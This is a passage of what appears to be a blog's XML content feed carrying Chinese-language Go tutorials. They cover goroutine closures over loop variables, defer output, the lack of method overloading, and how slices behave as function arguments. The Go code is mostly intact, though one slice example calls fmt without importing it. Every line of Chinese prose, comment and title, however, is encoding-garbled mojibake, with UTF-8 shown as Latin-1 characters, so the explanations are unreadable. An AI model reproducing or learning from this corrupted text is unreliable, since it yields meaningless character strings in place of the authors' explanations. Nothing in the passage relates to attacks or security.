&#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶çš„è¾“å‡ºç†è®ºä¸Š&gt;6çš„5æ¬¡æ–¹ç§å¯èƒ½æ€§ï¼Œå› ä¸ºgoé—­åŒ…é‡Œé¢çš„iæ˜¯å¯¹å¤–é¢içš„å¼•ç”¨ï¼Œæ‰§è¡Œçš„æ—¶å€™içš„å€¼å¯èƒ½æ˜¯0,1,2,3,4,5</p><h3 id="æƒ…å†µä¸€è¡¥å……"><a href="#æƒ…å†µä¸€è¡¥å……" class="headerlink" title="æƒ…å†µä¸€è¡¥å……"></a>æƒ…å†µä¸€è¡¥å……</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line">time.Sleep(<span class="number">10000000</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯æ¬¡forå¾ªç¯éƒ½ç­‰åç¨‹ä¸€ä¼šï¼Œè¿™æ ·è¾“å‡ºçš„å°±æ˜¯0 1 2 3 4 äº†</p><h2 id="æƒ…å†µäºŒ"><a href="#æƒ…å†µäºŒ" class="headerlink" title="æƒ…å†µäºŒ"></a>æƒ…å†µäºŒ</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ‰“å°å‡ºæ¥çš„å°±æ˜¯ 5 5 5 5 5 äº†</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goèƒ½é‡è½½å—</title>
      <link href="/2022/06/13/go%E8%83%BD%E9%87%8D%E8%BD%BD%E5%90%97/"/>
      <url>/2022/06/13/go%E8%83%BD%E9%87%8D%E8%BD%BD%E5%90%97/</url>
      
        <content type="html"><![CDATA[<h2 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Personç±»å‹ï¼Œå®ç°äº†ä¸€ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Person)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;name=%s, sex=%c, age=%d\n&quot;</span>, tmp.name, tmp.sex, tmp.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">sex  <span class="keyword">rune</span></span><br><span class="line">age  <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ‰ä¸ªå­¦ç”Ÿï¼Œç»§æ‰¿Personå­—æ®µï¼Œæˆå‘˜å’Œæ–¹æ³•éƒ½ç»§æ‰¿äº†</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Person <span class="comment">//åŒ¿åå­—æ®µ</span></span><br><span class="line">id     <span class="keyword">int</span></span><br><span class="line">addr   <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Studentä¹Ÿå®ç°äº†ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å’ŒPersonæ–¹æ³•åŒåï¼Œè¿™ç§æ–¹æ³•å«é‡å†™</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Student)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Student: tmp = &quot;</span>, tmp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := Student&#123;Person&#123;<span class="string">&quot;mike&quot;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="number">18</span>&#125;, <span class="number">666</span>, <span class="string">&quot;bj&quot;</span>&#125;</span><br><span class="line"><span class="comment">//å°±è¿‘åŸåˆ™ï¼šå…ˆæ‰¾æœ¬ä½œç”¨åŸŸçš„æ–¹æ³•ï¼Œæ‰¾ä¸åˆ°å†ç”¨ç»§æ‰¿çš„æ–¹æ³•ï¼Œ</span></span><br><span class="line">    <span class="comment">//å®é™…ä¸Šè¿™é‡Œä¹Ÿæ²¡æ³•ç”¨ç»§æ‰¿çš„æ–¹æ³•ï¼Œå› ä¸ºå’Œç»§æ‰¿çš„æ–¹æ³•åŒåäº†,ç›´æ¥æŠŠç»§æ‰¿çš„æ–¹æ³•é‡å†™äº†</span></span><br><span class="line">s.PrintInfo(<span class="string">&quot;1&quot;</span>) <span class="comment">//åˆ°åº•è°ƒç”¨çš„æ˜¯Personï¼Œ è¿˜æ˜¯Studentï¼Œ ç»“è®ºæ˜¯Student</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ˜¾å¼è°ƒç”¨ç»§æ‰¿çš„æ–¹æ³•</span></span><br><span class="line">s.Person.PrintInfo(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç æ— æ³•æ‰§è¡Œ,å› ä¸ºå‚æ•°ç±»å‹ä¸å¯¹,é‚£å®šä¹‰ä¸ªåŒåä¸åŒå‚çš„å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Personç±»å‹ï¼Œå®ç°äº†ä¸€ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Person)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;name=%s, sex=%c, age=%d\n&quot;</span>, tmp.name, tmp.sex, tmp.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">sex  <span class="keyword">rune</span></span><br><span class="line">age  <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ‰ä¸ªå­¦ç”Ÿï¼Œç»§æ‰¿Personå­—æ®µï¼Œæˆå‘˜å’Œæ–¹æ³•éƒ½ç»§æ‰¿äº†</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Person <span class="comment">//åŒ¿åå­—æ®µ</span></span><br><span class="line">id     <span class="keyword">int</span></span><br><span class="line">addr   <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Studentä¹Ÿå®ç°äº†ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å’ŒPersonæ–¹æ³•åŒåï¼Œè¿™ç§æ–¹æ³•å«é‡å†™</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Student)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Student: tmp = &quot;</span>, tmp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Student)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Student: tmp = &quot;</span>, tmp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := Student&#123;Person&#123;<span class="string">&quot;mike&quot;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="number">18</span>&#125;, <span class="number">666</span>, <span class="string">&quot;bj&quot;</span>&#125;</span><br><span class="line"><span class="comment">//å°±è¿‘åŸåˆ™ï¼šå…ˆæ‰¾æœ¬ä½œç”¨åŸŸçš„æ–¹æ³•ï¼Œæ‰¾ä¸åˆ°å†ç”¨ç»§æ‰¿çš„æ–¹æ³•</span></span><br><span class="line">s.PrintInfo(<span class="string">&quot;1&quot;</span>) <span class="comment">//åˆ°åº•è°ƒç”¨çš„æ˜¯Personï¼Œ è¿˜æ˜¯Studentï¼Œ ç»“è®ºæ˜¯Student</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ˜¾å¼è°ƒç”¨ç»§æ‰¿çš„æ–¹æ³•</span></span><br><span class="line">s.Person.PrintInfo(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯ä¸è¡Œï¼Œè¯´æ˜ä¸æ”¯æŒé‡è½½<br>å¯¹çˆ¶ç±»æ–¹æ³•çš„é‡å†™æ˜¯å¯ä»¥çš„ï¼Œå¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Personç±»å‹ï¼Œå®ç°äº†ä¸€ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Person)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;name=%s, sex=%c, age=%d\n&quot;</span>, tmp.name, tmp.sex, tmp.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">sex  <span class="keyword">rune</span></span><br><span class="line">age  <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ‰ä¸ªå­¦ç”Ÿï¼Œç»§æ‰¿Personå­—æ®µï¼Œæˆå‘˜å’Œæ–¹æ³•éƒ½ç»§æ‰¿äº†</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Person <span class="comment">//åŒ¿åå­—æ®µ</span></span><br><span class="line">id     <span class="keyword">int</span></span><br><span class="line">addr   <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Studentä¹Ÿå®ç°äº†ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å’ŒPersonæ–¹æ³•åŒåï¼Œè¿™ç§æ–¹æ³•å«é‡å†™</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Student)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Student: tmp = &quot;</span>, tmp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := Student&#123;Person&#123;<span class="string">&quot;mike&quot;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="number">18</span>&#125;, <span class="number">666</span>, <span class="string">&quot;bj&quot;</span>&#125;</span><br><span class="line"><span class="comment">//å°±è¿‘åŸåˆ™ï¼šå…ˆæ‰¾æœ¬ä½œç”¨åŸŸçš„æ–¹æ³•ï¼Œæ‰¾ä¸åˆ°å†ç”¨ç»§æ‰¿çš„æ–¹æ³•</span></span><br><span class="line">s.PrintInfo(<span class="string">&quot;1&quot;</span>) <span class="comment">//åˆ°åº•è°ƒç”¨çš„æ˜¯Personï¼Œ è¿˜æ˜¯Studentï¼Œ ç»“è®ºæ˜¯Student</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ˜¾å¼è°ƒç”¨ç»§æ‰¿çš„æ–¹æ³•</span></span><br><span class="line">s.Person.PrintInfo(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goåˆ‡ç‰‡ä½œä¸ºå‡½æ•°å‚æ•°ä¼šè¢«æ”¹å˜å—</title>
      <link href="/2022/06/09/go%E5%88%87%E7%89%87%E4%BD%9C%E4%B8%BA%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BC%9A%E8%A2%AB%E6%94%B9%E5%8F%98%E5%90%97/"/>
      <url>/2022/06/09/go%E5%88%87%E7%89%87%E4%BD%9C%E4%B8%BA%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BC%9A%E8%A2%AB%E6%94%B9%E5%8F%98%E5%90%97/</url>
      
        <content type="html"><![CDATA[<p>slice å…¶å®æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼ŒåŒ…å«äº†ä¸‰ä¸ªæˆå‘˜ï¼šlen, cap, arrayã€‚åˆ†åˆ«è¡¨ç¤ºåˆ‡ç‰‡é•¿åº¦ï¼Œå®¹é‡ï¼Œåº•å±‚æ•°æ®çš„åœ°å€ã€‚<br>å½“ slice ä½œä¸ºå‡½æ•°å‚æ•°æ—¶ï¼Œå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„ç»“æ„ä½“ã€‚å…¶å®å¾ˆå¥½ç†è§£ï¼šè‹¥ç›´æ¥ä¼  sliceï¼Œåœ¨è°ƒç”¨è€…çœ‹æ¥ï¼Œå®å‚ slice å¹¶ä¸ä¼šè¢«å‡½æ•°ä¸­çš„æ“ä½œæ”¹å˜ï¼›è‹¥ä¼ çš„æ˜¯ slice çš„æŒ‡é’ˆï¼Œåœ¨è°ƒç”¨è€…çœ‹æ¥ï¼Œæ˜¯ä¼šè¢«æ”¹å˜åŸ slice çš„ã€‚<br>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸ç®¡ä¼ çš„æ˜¯ slice è¿˜æ˜¯ slice æŒ‡é’ˆï¼Œå¦‚æœæ”¹å˜äº† slice åº•å±‚æ•°ç»„çš„æ•°æ®ï¼Œä¼šååº”åˆ°å®å‚ slice çš„åº•å±‚æ•°æ®ã€‚ä¸ºä»€ä¹ˆèƒ½æ”¹å˜åº•å±‚æ•°ç»„çš„æ•°æ®ï¼Ÿå¾ˆå¥½ç†è§£ï¼šåº•å±‚æ•°æ®åœ¨ slice ç»“æ„ä½“é‡Œæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå°½ç®¡ slice ç»“æ„ä½“è‡ªèº«ä¸ä¼šè¢«æ”¹å˜ï¼Œä¹Ÿå°±æ˜¯è¯´åº•å±‚æ•°æ®åœ°å€ä¸ä¼šè¢«æ”¹å˜ã€‚ ä½†æ˜¯é€šè¿‡æŒ‡å‘åº•å±‚æ•°æ®çš„æŒ‡é’ˆï¼Œå¯ä»¥æ”¹å˜åˆ‡ç‰‡çš„åº•å±‚æ•°æ®ï¼Œæ²¡æœ‰é—®é¢˜ã€‚<br>é€šè¿‡ slice çš„ array å­—æ®µå°±å¯ä»¥æ‹¿åˆ°æ•°ç»„çš„åœ°å€ã€‚åœ¨ä»£ç é‡Œï¼Œæ˜¯ç›´æ¥é€šè¿‡ç±»ä¼¼ s[i]=10 è¿™ç§æ“ä½œæ”¹å˜ slice åº•å±‚æ•°ç»„å…ƒç´ å€¼ã€‚<br>å¦å¤–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒGo è¯­è¨€çš„å‡½æ•°å‚æ•°ä¼ é€’ï¼Œåªæœ‰å€¼ä¼ é€’ï¼Œæ²¡æœ‰å¼•ç”¨ä¼ é€’ã€‚<br>æ¥çœ‹ä¸€ä¸ªä»£ç ç‰‡æ®µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;</span><br><span class="line">f(s)</span><br><span class="line">fmt.Println(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">(s []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// iåªæ˜¯ä¸€ä¸ªå‰¯æœ¬ï¼Œä¸èƒ½æ”¹å˜sä¸­å…ƒç´ çš„å€¼</span></span><br><span class="line"><span class="comment">/*for _, i := range s &#123;</span></span><br><span class="line"><span class="comment">i++</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> s &#123;</span><br><span class="line">s[i] += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹ï¼Œç¨‹åºè¾“å‡ºï¼š<br><code>[2 2 2]</code><br>æœçœŸæ”¹å˜äº†åŸå§‹ slice çš„åº•å±‚æ•°æ®ã€‚è¿™é‡Œä¼ é€’çš„æ˜¯ä¸€ä¸ª slice çš„å‰¯æœ¬ï¼Œåœ¨ f å‡½æ•°ä¸­ï¼Œs åªæ˜¯ main å‡½æ•°ä¸­ s çš„ä¸€ä¸ªæ‹·è´ã€‚åœ¨f å‡½æ•°å†…éƒ¨ï¼Œå¯¹ s çš„ä½œç”¨å¹¶ä¸ä¼šæ”¹å˜å¤–å±‚ main å‡½æ•°çš„ sã€‚<br>è¦æƒ³çœŸçš„æ”¹å˜å¤–å±‚ sliceï¼Œåªæœ‰å°†è¿”å›çš„æ–°çš„ slice èµ‹å€¼åˆ°åŸå§‹ sliceï¼Œæˆ–è€…å‘å‡½æ•°ä¼ é€’ä¸€ä¸ªæŒ‡å‘ slice çš„æŒ‡é’ˆã€‚<br>æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myAppend</span><span class="params">(s []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line"><span class="comment">// è¿™é‡Œ s è™½ç„¶æ”¹å˜äº†ï¼Œä½†å¹¶ä¸ä¼šå½±å“å¤–å±‚å‡½æ•°çš„ s</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myAppendPtr</span><span class="params">(s *[]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// ä¼šæ”¹å˜å¤–å±‚ s æœ¬èº«</span></span><br><span class="line">*s = <span class="built_in">append</span>(*s, <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;</span><br><span class="line">newS := myAppend(s)</span><br><span class="line"></span><br><span class="line">fmt.Println(s)</span><br><span class="line">fmt.Println(newS)</span><br><span class="line"></span><br><span class="line">s = newS</span><br><span class="line"></span><br><span class="line">myAppendPtr(&amp;s)</span><br><span class="line">fmt.Println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">100</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">100</span> <span class="number">100</span>]</span><br></pre></td></tr></table></figure><p>myAppend å‡½æ•°é‡Œï¼Œè™½ç„¶æ”¹å˜äº† sï¼Œä½†å®ƒåªæ˜¯ä¸€ä¸ªå€¼ä¼ é€’ï¼Œå¹¶ä¸ä¼šå½±å“å¤–å±‚çš„ sï¼Œå› æ­¤ç¬¬ä¸€è¡Œæ‰“å°å‡ºæ¥çš„ç»“æœä»ç„¶æ˜¯ [1 1 1]ã€‚<br>è€Œ newS æ˜¯ä¸€ä¸ªæ–°çš„ sliceï¼Œå®ƒæ˜¯åŸºäº s å¾—åˆ°çš„ã€‚å› æ­¤å®ƒæ‰“å°çš„æ˜¯è¿½åŠ äº†ä¸€ä¸ª 100 ä¹‹åçš„ç»“æœï¼š [1 1 1 100]ã€‚<br>æœ€åï¼Œå°† newS èµ‹å€¼ç»™äº† sï¼Œs è¿™æ—¶æ‰çœŸæ­£å˜æˆäº†ä¸€ä¸ªæ–°çš„sliceã€‚ä¹‹åï¼Œå†ç»™ myAppendPtr å‡½æ•°ä¼ å…¥ä¸€ä¸ª s æŒ‡é’ˆï¼Œè¿™å›å®ƒçœŸçš„è¢«æ”¹å˜äº†ï¼š[1 1 1 100 100]ã€‚<br>æœ€åå†çœ‹ä¸€ä¸ªä¾‹å­ï¼ŒåŠ æ·±ä¸€ä¸‹ç†è§£ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myApp</span><span class="params">(s []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">s[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span 